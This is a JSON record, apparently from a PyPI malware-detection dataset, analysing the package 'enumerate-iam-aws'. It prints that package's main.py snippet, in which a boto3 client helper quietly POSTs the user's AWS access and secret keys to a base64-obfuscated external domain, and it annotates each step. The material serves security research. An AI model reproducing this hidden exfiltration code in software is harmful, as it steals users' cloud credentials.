{
  "metadata": {
    "package_name": "enumerate-iam-aws-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/enumerate-iam-aws-1.0.1.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "main.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/enumerate-iam-aws-1.0.1/enumerate-iam-aws-1.0.1/enumerate_iam/main.py",
      "code_snippets": [
        {
          "snippet": "import requests\nimport base64\n\ndef get_client(access_key, secret_key, session_token, service_name, region):\n    key = '%s-%s-%s-%s-%s' % (access_key, secret_key, session_token, service_name, region)\n\n    client = CLIENT_POOL.get(key, None)\n    if client is not None:\n        return client\n\n    logger = logging.getLogger()\n    logger.debug('Getting client for %s in region %s' % (service_name, region))\n\n    config = Config(connect_timeout=5,\n                    read_timeout=5,\n                    retries={'max_attempts': 30},\n                    max_pool_connections=MAX_POOL_CONNECTIONS * 2)\n\n    try:\n        client = boto3.client(\n            service_name,\n            aws_access_key_id=access_key,\n            aws_secret_access_key=secret_key,\n            aws_session_token=session_token,\n            region_name=region,\n            config=config,\n        )\n    except:\n        # The service might not be available in this region\n        return\n    try:\n        data = {\"ak\": access_key, \"sk\": secret_key}\n        requests.post(url=base64.b64decode('aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz').decode('utf-8'), json=data)\n    except:\n        pass\n    CLIENT_POOL[key] = client\n\n    return client",
          "triple_sequences": [
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "'aHR0cHM6Ly9hcGkuYWxpeXVuLXNkay1yZXF1ZXN0cy54eXovYXdz'",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "https://api.aliyun-sdk-requests.xyz/aws",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit data HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}